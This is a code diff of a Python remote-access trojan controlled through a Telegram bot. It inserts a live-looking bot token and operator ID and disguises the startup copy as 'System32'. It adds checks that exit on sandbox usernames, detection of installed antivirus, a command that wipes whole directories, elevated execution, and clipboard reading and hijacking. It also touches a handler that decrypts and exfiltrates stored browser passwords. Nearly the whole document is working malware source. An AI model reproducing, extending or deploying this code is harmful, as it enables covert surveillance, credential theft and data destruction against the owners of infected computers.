@@ -4,6 +4,7 @@ import os
 import sys
 import cv2
 import wave
+import glob
 import time
 import shutil
 import psutil
@@ -12,6 +13,7 @@ import sqlite3
 import pyaudio
 import requests
 import platform
+import pyperclip
 import webbrowser
 import win32crypt
 import json,base64
@@ -20,7 +22,6 @@ from PIL import ImageGrab
 from telebot import types
 from telebot import util
 from ctypes import *
-from telebot import apihelper
 from ctypes.wintypes import *
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
@@ -28,15 +29,12 @@ from urllib.error import HTTPError
 from win32gui import GetWindowText, GetForegroundWindow
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
-#Прокси (Если не работает)
-apihelper.proxy = {'http':'http://x.x.x.x:port'}
-
 #Название файла при копировании в автозагрузку
-fname = 'System' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
+fname = 'System32' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
 #Токен/Айди
-token = 'Токен'
-adm = 'Айди'
+token = '1120065226:AAGHKB8wz_hbe0vfBaX__jfds4UdXTj2ji4'
+adm = '643200553'
 
 bot = telebot.TeleBot(token, threaded=True)
 bot.worker_pool = util.ThreadPool(num_threads=30)
@@ -107,7 +105,7 @@ main7 = types.ReplyKeyboardMarkup()
 button1 = types.KeyboardButton('/CD\n🗂')
 button2 = types.KeyboardButton('/Upload\n📡')
 button3 = types.KeyboardButton('/PWD\n📄')
-button4 = types.KeyboardButton('/Delete\n🗑')
+button4 = types.KeyboardButton('/Remove\n🗑')
 button5 = types.KeyboardButton('/Download\n📨')
 button6 = types.KeyboardButton('/Run\n📌')
 button7 = types.KeyboardButton('/Cancel')
@@ -175,31 +173,31 @@ main13.row(button1)
 main13.row(button2)
 
 
+for file in glob.glob('C:\\Users\\John\\Desktop\\foobar.*'):
+   sys.exit()
+for file in glob.glob('C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk'):
+   sys.exit()
+
+
 if os.path.exists('C:\\Program Files\\Windows Defender'):
    av = 'Windows Defender'
 if os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
    av = 'Avast'
 if os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
    av = 'AVG'
-if os.path.exists('C:\\Program Files\\Avira\\Launcher'):
+if os.path.exists('C:\\Program Files (x86)\\Avira\\Launcher'):
    av = 'Avira'
-if os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
+if os.path.exists('C:\\Program Files (x86)\\IObit\\Advanced SystemCare'):
    av = 'Advanced SystemCare'
 if os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
    av = 'Bitdefender'
-if os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
-   av = 'Comodo'
 if os.path.exists('C:\\Program Files\\DrWeb'):
    av = 'Dr.Web'
 if os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
    av = 'ESET'
-if os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
-   av = 'Grizzly Pro'
-if os.path.exists('C:\\Program Files\\Kaspersky Lab'):
+if os.path.exists('C:\\Program Files (x86)\\Kaspersky Lab'):
    av = 'Kaspersky'
-if os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
-   av = 'Malware fighter'
-if os.path.exists('C:\\Program Files\\360\\Total Security'):
+if os.path.exists('C:\\Program Files (x86)\\360\\Total Security'):
    av = '360 Total Security'
 else:
    pass
@@ -223,11 +221,10 @@ while True:
     os.makedirs('C:\\ProgramData\\Files')
     os.makedirs('C:\\ProgramData\\Files\\Documents')
     os.makedirs('C:\\ProgramData\\Files\\Photos')
-    os.makedirs('C:\\ProgramData\\Files\\Music')
-    os.makedirs('C:\\ProgramData\\Files\\Voice')
  except:
-   pass
+   print('[-] › Нет подключения')
  else:
+   print('[+] › Подключено')
    break
 
 @bot.message_handler(commands=['Start', 'start', 'Help', 'help'])
@@ -246,8 +243,8 @@ def help(command):
   '\n'
   '\n/Files - Файловый менеджер'
   '\n› /CD - Текущая директория'
-  '\n› /Pwd - Просмотр содержимого'
-  '\n› /Delete - Удалить файл'
+  '\n› /Pwd - Список файлов'
+  '\n› /Remove - Удалить файл'
   '\n› /Upload - Загрузить файл'
   '\n› /Download - Скачать файл'
   '\n› /Run - Запустить файл'
@@ -261,6 +258,7 @@ def help(command):
   '\n/OpenEXE - Запуск программ'
   '\n'
   '\n/Passwords - Получить пароли'
+  '\n/Clipboard - Буфер обмена'
   '\n'
   '\n'
   '\n_Coded by Bainky_ | *@bainki* 👾', 
@@ -268,15 +266,12 @@ def help(command):
 
 @bot.message_handler(commands=['3', '6'])
 def main(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")
 @bot.message_handler(commands=['2', '5'])
 def main(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")
 @bot.message_handler(commands=['4', '1'])
 def main(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Screen', 'screen'])
@@ -687,7 +682,6 @@ def callback_inline(call):
 
 @bot.message_handler(commands=['Files', 'files'])
 def files(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")
 
 @bot.message_handler(commands=['CD'])
@@ -714,12 +708,12 @@ def cd(message):
  except:
   bot.send_message(message.chat.id, '*Текущая директория*\n \n`' + os.getcwd() + '`', parse_mode="Markdown")
 
-@bot.message_handler(commands=['Delete'])
-def delete(message):
+@bot.message_handler(commands=['Remove'])
+def remove(message):
  try:
   bot.send_chat_action(message.chat.id, 'typing')
   user_msg = "{0}".format(message.text)
-  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
+  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
   year,month,day,hour,minute,second=time.localtime(created)[:-3]
   def convert_bytes(num):
       for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
@@ -731,30 +725,30 @@ def delete(message):
           file_info = os.stat(file_path)
           return convert_bytes(file_info.st_size)
   bot.send_message(message.chat.id, 
-    'Файл *' + user_msg.split("/Delete ")[1] + '* удален!' 
+    'Файл *' + user_msg.split("/Remove ")[1] + '* удален!' 
     '\n' 
     '\nСоздан » %02d/%02d/%d'%(day,month,year) +
-    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/Delete ")[1]),
+    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/Remove ")[1]),
     parse_mode="Markdown")
-  os.remove(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
+  os.remove(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
  except:
   try:
     bot.send_chat_action(message.chat.id, 'typing')
-    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
+    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
     year,month,day,hour,minute,second=time.localtime(created)[:-3]
-    folder = os.getcwd() + '\\' + user_msg.split("/Delete ")[1]
+    folder = os.getcwd() + '\\' + user_msg.split("/Remove ")[1]
     folder_size = 0
     for (path, dirs, files) in os.walk(folder):
       for file in files:
         filename = os.path.join(path, file)
         folder_size += os.path.getsize(filename)
     files = folders = 0
-    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/Delete ")[1]):
+    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/Remove ")[1]):
         files += len(filenames)
         folders += len(dirnames)
-    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/Delete ")[1])
+    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/Remove ")[1])
     bot.send_message(message.chat.id, 
-      'Папка *' + user_msg.split("/Delete ")[1] + '* удалена!'
+      'Папка *' + user_msg.split("/Remove ")[1] + '* удалена!'
       '\n'
       '\nСоздана » %02d/%02d/%d'%(day,month,year) +
       '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
@@ -765,14 +759,14 @@ def delete(message):
   except PermissionError:
   	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
   except:
-  	bot.send_message(message.chat.id, '*Введите название файла\n \n• /Delete*', parse_mode="Markdown")
+  	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['delete'])
-def delete(message):
+@bot.message_handler(commands=['remove'])
+def remove(message):
  try:
   bot.send_chat_action(message.chat.id, 'typing')
   user_msg = "{0}".format(message.text)
-  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
+  created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
   year,month,day,hour,minute,second=time.localtime(created)[:-3]
   def convert_bytes(num):
       for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
@@ -784,30 +778,30 @@ def delete(message):
           file_info = os.stat(file_path)
           return convert_bytes(file_info.st_size)
   bot.send_message(message.chat.id, 
-    'Файл *' + user_msg.split("/delete ")[1] + '* удален!' 
+    'Файл *' + user_msg.split("/remove ")[1] + '* удален!' 
     '\n' 
     '\nСоздан » %02d/%02d/%d'%(day,month,year) +
-    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/delete ")[1]),
+    '\nРазмер » ' + file_size(os.getcwd() + '\\' + user_msg.split("/remove ")[1]),
     parse_mode="Markdown")
-  os.remove(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
+  os.remove(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
  except:
   try:
     bot.send_chat_action(message.chat.id, 'typing')
-    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
+    created = os.path.getctime(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
     year,month,day,hour,minute,second=time.localtime(created)[:-3]
-    folder = os.getcwd() + '\\' + user_msg.split("/delete ")[1]
+    folder = os.getcwd() + '\\' + user_msg.split("/remove ")[1]
     folder_size = 0
     for (path, dirs, files) in os.walk(folder):
       for file in files:
         filename = os.path.join(path, file)
         folder_size += os.path.getsize(filename)
     files = folders = 0
-    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/delete ")[1]):
+    for _, dirnames, filenames in os.walk(os.getcwd() + '\\' + user_msg.split("/remove ")[1]):
         files += len(filenames)
         folders += len(dirnames)
-    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/delete ")[1])
+    shutil.rmtree(os.getcwd() + '\\' + user_msg.split("/remove ")[1])
     bot.send_message(message.chat.id, 
-      'Папка *' + user_msg.split("/delete ")[1] + '* удалена!'
+      'Папка *' + user_msg.split("/remove ")[1] + '* удалена!'
       '\n'
       '\nСоздана » %02d/%02d/%d'%(day,month,year) +
       '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
@@ -818,7 +812,41 @@ def delete(message):
   except PermissionError:
     bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
   except:
-    bot.send_message(message.chat.id, '*Введите название файла\n \n• /Delete*', parse_mode="Markdown")
+    bot.send_message(message.chat.id, '*Введите название файла\n \n› /Remove • /RemoveAll*', parse_mode="Markdown")
+
+@bot.message_handler(commands=['RemoveAll', 'removeall'])
+def removeall(command):
+ try:
+  folder = os.getcwd()
+  folder_size = 0
+  for (path, dirs, files) in os.walk(folder):
+    for file in files:
+      filename = os.path.join(path, file)
+      folder_size += os.path.getsize(filename)
+  files = folders = 0
+  for _, dirnames, filenames in os.walk(os.getcwd()):
+      files += len(filenames)
+      folders += len(dirnames)
+  a = (len(glob.glob('*')))
+  try:
+   for file in glob.glob('*.*'):
+    if os.path.isfile(file):
+      os.remove(file)
+   for directory in glob.glob('*/'):
+    if os.path.exists(directory):
+      shutil.rmtree(directory)
+  except PermissionError:
+     pass
+  b = (len(glob.glob('*')))
+  c = (a - b)
+  bot.send_message(command.chat.id,
+     'Удалено *' + str(c) + '* файлов из *' + str(a) + '*!'
+     '\n'
+     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0)) +
+     '\nСодержало » ' + "{:,} Файлов, {:,} Папок".format(files, folders),
+     parse_mode="Markdown")
+ except:
+  pass
 
 @bot.message_handler(commands=['Upload', 'upload'])
 def upload(message):
@@ -836,7 +864,7 @@ def upload(message):
  except ValueError:
   bot.send_message(message.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n \n• /Upload*', parse_mode="Markdown")
+  bot.send_message(message.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n \n› /Upload*', parse_mode="Markdown")
 
 @bot.message_handler(content_types=['document'])
 def document(message):
@@ -882,7 +910,7 @@ def download(message):
         os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
         bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
     except:
-        bot.send_message(message.chat.id, '*Введите название файла\n \n• /Download*', parse_mode="Markdown")
+        bot.send_message(message.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['download'])
 def download(message):
@@ -913,7 +941,7 @@ def download(message):
         os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
         bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
     except:
-        bot.send_message(message.chat.id, '*Введите название файла\n \n• /Download*', parse_mode="Markdown")
+        bot.send_message(message.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['Run'])
 def run(message):
@@ -925,7 +953,7 @@ def run(message):
  except FileNotFoundError:
  	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
- 	bot.send_message(message.chat.id, '*Введите название файла*\n \n• /Run', parse_mode="Markdown")
+ 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['run'])
 def run(message):
@@ -937,7 +965,35 @@ def run(message):
  except FileNotFoundError:
  	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
-    bot.send_message(message.chat.id, '*Введите название файла*\n \n• /Run', parse_mode="Markdown")
+    bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
+
+@bot.message_handler(commands=['RunAS'])
+def runas(message):
+ try:
+  bot.send_chat_action(message.chat.id, 'typing')
+  user_msg = "{0}".format(message.text)
+  os.startfile(os.getcwd() + '\\' + user_msg.split("/RunAS ")[1], 'runas')
+  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/RunAS ")[1] + '* открыт!', parse_mode="Markdown")
+ except OSError:
+ 	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
+ except FileNotFoundError:
+ 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
+ except:
+ 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
+
+@bot.message_handler(commands=['runas'])
+def runas(message):
+ try:
+  bot.send_chat_action(message.chat.id, 'typing')
+  user_msg = "{0}".format(message.text)
+  os.startfile(os.getcwd() + '\\' + user_msg.split("/runas ")[1], 'runas')
+  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/runas ")[1] + '* открыт!', parse_mode="Markdown")
+ except OSError:
+ 	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
+ except FileNotFoundError:
+ 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
+ except:
+ 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['PWD', 'pwd'])
 def pwd(command):
@@ -957,7 +1013,6 @@ def pwd(command):
 
 @bot.message_handler(commands=['Cancel', 'cancel'])
 def cancelfiles(command):
- bot.send_chat_action(command.chat.id, 'typing')
  bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")
 
 @bot.message_handler(commands=['Tasklist', 'tasklist'])
@@ -981,7 +1036,7 @@ def taskkill(message):
   bot.send_message(message.chat.id, 
   '*Введите название процесса'
   '\n'
-  '\n• /Taskkill*'
+  '\n› /Taskkill*'
   '\n'
   '\n*Активное окно*'
   '\n'
@@ -996,7 +1051,7 @@ def message(message):
   ctypes.windll.user32.MessageBoxW(0, user_msg.split("/Message ")[1], u'Information', 0x10)
   bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Введите сообщение\n \n• /Message*', parse_mode="Markdown")
+  bot.send_message(message.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['message'])
 def message(message):
@@ -1006,7 +1061,7 @@ def message(message):
   ctypes.windll.user32.MessageBoxW(0, user_msg.split("/message ")[1], u'Information', 0x10)
   bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Введите сообщение\n \n• /Message*', parse_mode="Markdown")
+  bot.send_message(message.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['OpenURL', 'openurl'])
 def openurl(message):
@@ -1017,7 +1072,7 @@ def openurl(message):
   webbrowser.open_new_tab(url)
   bot.reply_to(message, '*Ссылка открыта!*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Вставьте ссылку\n \n• /OpenURL*', parse_mode="Markdown")
+  bot.send_message(message.chat.id, '*Вставьте ссылку\n \n› /OpenURL*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['Wallpapers', 'wallpapers'])
 def wallpapers(command):
@@ -1040,7 +1095,7 @@ def wallpapers(message):
 
 @bot.message_handler(commands=['Voice', 'voice'])
 def voice(command):
- bot.send_message(command.chat.id, '*Введите текст\n \n• /Say*', parse_mode="Markdown")
+ bot.send_message(command.chat.id, '*Введите текст\n \n› /Say*', parse_mode="Markdown")
 
 @bot.message_handler(commands=['Say'])
 def say(message):
@@ -1078,50 +1133,10 @@ def say(message):
  except:
   pass
 
-@bot.message_handler(content_types=['voice'])
-def voiceloader(message):
- try:
-  file_info = bot.get_file(message.voice.file_id)
-  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
-  downloaded_file = bot.download_file(file_info.file_path)
-  src='C:\\ProgramData\\Files\\'+file_info.file_path;
-  with open(src, 'wb') as new_file:
-   new_file.write(downloaded_file)
-  os.startfile('C:\\ProgramData\\Files\\'+file_info.file_path)
-  devices = AudioUtilities.GetSpeakers()
-  interface = devices.Activate(
-      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-  volume = cast(interface, POINTER(IAudioEndpointVolume))
-  volume.SetMasterVolumeLevel(-0.0, None)
-  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-  del speaker
- except:
-  pass
-
-@bot.message_handler(content_types=['audio'])
-def audiospeaker(message):
- try:
-  file_info = bot.get_file(message.audio.file_id)
-  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
-  downloaded_file = bot.download_file(file_info.file_path)
-  src='C:\\ProgramData\\Files\\'+file_info.file_path;
-  with open(src, 'wb') as new_file:
-   new_file.write(downloaded_file)
-  os.startfile('C:\\ProgramData\\Files\\'+file_info.file_path)
-  devices = AudioUtilities.GetSpeakers()
-  interface = devices.Activate(
-      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-  volume = cast(interface, POINTER(IAudioEndpointVolume))
-  volume.SetMasterVolumeLevel(-0.0, None)
-  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-  del speaker
- except:
-  pass
-
 @bot.message_handler(commands=['Passwords', 'passwords'])
 def passwords(command):
  try:
-  bot.send_chat_action(command.chat.id, 'typing')
+  bot.send_chat_action(command.chat.id, 'upload_document')
   from cryptography.hazmat.backends import default_backend
   from cryptography.hazmat.primitives.ciphers import (
       Cipher, algorithms, modes)
@@ -1260,6 +1275,42 @@ def passwords(command):
        pass
  except:
  	bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")
+
+@bot.message_handler(commands=['Clipboard'])
+def clipboard(message):
+ try:
+  bot.send_chat_action(message.chat.id, 'typing')
+  user_msg = "{0}".format(message.text)
+  pyperclip.copy(user_msg.split("/Clipboard ")[1])
+  bot.send_message(message.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
+ except:
+  bot.send_message(message.chat.id,
+  '*Введите текст'
+  '\n'
+  '\n› /Clipboard'
+  '\n'
+  '\nБуфер обмена*'
+  '\n'
+  '\n« `' + pyperclip.paste() + '` »',
+  parse_mode="Markdown")
+
+@bot.message_handler(commands=['clipboard'])
+def clipboard(message):
+ try:
+  bot.send_chat_action(message.chat.id, 'typing')
+  user_msg = "{0}".format(message.text)
+  pyperclip.copy(user_msg.split("/clipboard ")[1])
+  bot.send_message(message.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
+ except:
+  bot.send_message(message.chat.id,
+  '*Введите текст'
+  '\n'
+  '\n› /clipboard'
+  '\n'
+  '\nБуфер обмена*'
+  '\n'
+  '\n« `' + pyperclip.paste() + '` »',
+  parse_mode="Markdown")
 
 try:
   bot.polling(none_stop=True)
